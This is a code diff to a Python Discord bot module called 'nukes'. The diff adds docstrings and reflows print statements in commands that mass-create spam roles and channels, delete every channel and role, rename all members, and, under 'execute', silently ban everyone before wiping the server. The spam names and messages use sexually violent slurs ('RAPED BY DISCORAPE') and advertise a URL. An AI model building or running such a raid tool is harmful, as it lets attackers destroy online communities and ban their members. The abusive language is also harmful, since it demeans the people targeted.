@@ -43,7 +43,7 @@ class nukes(commands.Cog):
 
     @commands.command()
     async def rolecreate(self, ctx):
-        """Mass creates
+        """Mass creates roles
 
         Usage
         • rolecreate
@@ -56,14 +56,16 @@ class nukes(commands.Cog):
             try:
                 await ctx.guild.create_role(
                     name=f"RAPED BY DISCORAPE https://daddie.xyz{i}"
-                    )
-                print(f"{Fore.GREEN}[-]ROLE > {Fore.RESET}Made role:  RAPED BY DISCORAPE https://daddie.xyz{i}")
+                )
+                print(
+                    f"{Fore.GREEN}[-]ROLE > {Fore.RESET}Made role:  RAPED BY DISCORAPE https://daddie.xyz{i}"
+                )
             except:
                 print(f"{Fore.RED}[-]ROLE > {Fore.RESET}Failed to make role")
 
-
     @commands.command()
     async def channelcreate(self, ctx):
+        """Spams the everloving fuck outta the channels voice text and category\nNote: It's a pain in the ass to clean up"""
         await ctx.message.delete()
         await ctx.send("Time to spam super fucking gay shit")
         await ctx.send("Standby for spam creation")
@@ -73,20 +75,27 @@ class nukes(commands.Cog):
                 await ctx.guild.create_text_channel(
                     name=f"NUKED-BY-DISCORAPE-{i}-https://daddie.xyz"
                 )
-                print(f"{Fore.GREEN}[-]CHANNEL > {Fore.RESET}Made text channel:  NUKED-BY-DISCORAPE-{i}-https://daddie.xyz")
+                print(
+                    f"{Fore.GREEN}[-]CHANNEL > {Fore.RESET}Made text channel:  NUKED-BY-DISCORAPE-{i}-https://daddie.xyz"
+                )
                 await ctx.guild.create_voice_channel(
                     name=f"NUKED BY DISCORAPE {i} https://daddie.xyz"
                 )
-                print(f"{Fore.GREEN}[-]CHANNEL > {Fore.RESET}Made voice channel:  NUKED BY DISCORAPE {i} https://daddie.xyz")
+                print(
+                    f"{Fore.GREEN}[-]CHANNEL > {Fore.RESET}Made voice channel:  NUKED BY DISCORAPE {i} https://daddie.xyz"
+                )
                 await ctx.guild.create_category(
                     name=f"NUKED BY DISCORAPE {i} https://daddie.xyz"
                 )
-                print(f"{Fore.RED}[-]CHANNEl > {Fore.RESET}Made category: NUKED BY DISCORAPE {i} https://daddie.xyz")
+                print(
+                    f"{Fore.RED}[-]CHANNEl > {Fore.RESET}Made category: NUKED BY DISCORAPE {i} https://daddie.xyz"
+                )
             except:
                 print("An error occured while trying to make the channels")
 
     @commands.command()
     async def channeldelete(self, ctx):
+        """Deletes any and every channel it can delete"""
         await ctx.send("Deleting all channels...\nhttps://daddie.xyz")
         await ctx.send("Standby...")
         print(f"{Fore.RED}[-]DANGER > Channel nuking has begun!")
@@ -99,6 +108,7 @@ class nukes(commands.Cog):
 
     @commands.command()
     async def roledelete(self, ctx):
+        """Deletes every role except roles above you or bot specific roles like dyno"""
         await ctx.message.delete()
         await ctx.send("Spamming role deletion..")
         await ctx.send("Please wait...")
@@ -115,8 +125,8 @@ class nukes(commands.Cog):
 
     @commands.command()
     async def execute(self, ctx):
+        """Nukes the fucking shit outta the server banning everyone silently. While no one notices\nNext up it deletes all roles  then creates DiscoRape roles\nThen it deletes all channels possible to then make DiscoRape channels"""
         await ctx.message.delete()
-        await ctx.send("Executing...\nhttps://i.imgur.com/vhzlkat.png")
         print(
             f"{Fore.RED}[-]DANGER > {Fore.RESET}Nuking has begun...\n{Fore.RED}[-]BANNING > {Fore.RESET}Banning process has begun\n"
         )
@@ -141,7 +151,9 @@ class nukes(commands.Cog):
                     await role.delete()
                     print(f"{Fore.GREEN}[-]ROLE > {Fore.RESET}Deleted {role}")
                 except:
-                    print(f"{Fore.RED}[-]ROLE > {Fore.RESET}Failed to delete role: {role}")
+                    print(
+                        f"{Fore.RED}[-]ROLE > {Fore.RESET}Failed to delete role: {role}"
+                    )
             else:
                 await ctx.send("There was an error while deleting the roles.")
 
@@ -192,10 +204,15 @@ class nukes(commands.Cog):
         for user in list(ctx.guild.members):
             try:
                 await user.edit(nick=rename_to)
-                print (f"{Fore.GREEN}[-]NICK > {Fore.RESET}Old name: {user.name} | New name: {rename_to} | Guild: {ctx.guild.name}")
+                print(
+                    f"{Fore.GREEN}[-]NICK > {Fore.RESET}Old name: {user.name} | New name: {rename_to} | Guild: {ctx.guild.name}"
+                )
             except:
-                print (f"{Fore.RED}[-]NICK > {Fore.RESET}{user.name} has NOT been renamed to {rename_to} in {ctx.guild.name}")
+                print(
+                    f"{Fore.RED}[-]NICK > {Fore.RESET}{user.name} has NOT been renamed to {rename_to} in {ctx.guild.name}"
+                )
         print(f"{Fore.RED}[-]NICK > {Fore.RESET}Action Completed: rall")
+
 
 def setup(bot):
     bot.add_cog(nukes(bot))
